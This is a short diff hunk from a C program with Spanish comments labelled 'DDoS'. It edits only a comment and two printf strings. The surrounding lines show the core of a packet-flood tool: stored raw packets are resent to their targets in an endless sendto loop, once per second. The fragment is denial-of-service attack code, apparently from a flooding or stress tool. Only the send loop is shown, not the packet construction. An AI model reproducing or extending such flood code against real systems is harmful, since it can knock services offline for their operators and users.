@@ -95,13 +95,13 @@ tcpsend(rs[j],inet_addr(ip_buffer),srcp,dstp,payload,payload_len);
 ALAN++;
 
 }}
-//Ya estan los paquetesd calculaDDoS
-printf("A MITIG.AR\n");
+//Paquetes computizaDDoS
+printf("A MITIG.AR...\n");
 while(true){
 for(A=0;A<ALAN;A++){
 sendto(sockfd, CASALAN[A].packet, CASALAN[A].packet_size, 0, (const sockaddr*) &CASALAN[A].sock,CASALAN[A].sockaddr_in_size);
 }
-printf("6\n");
+printf("6");
 sleep(1);
 }
 return 0;
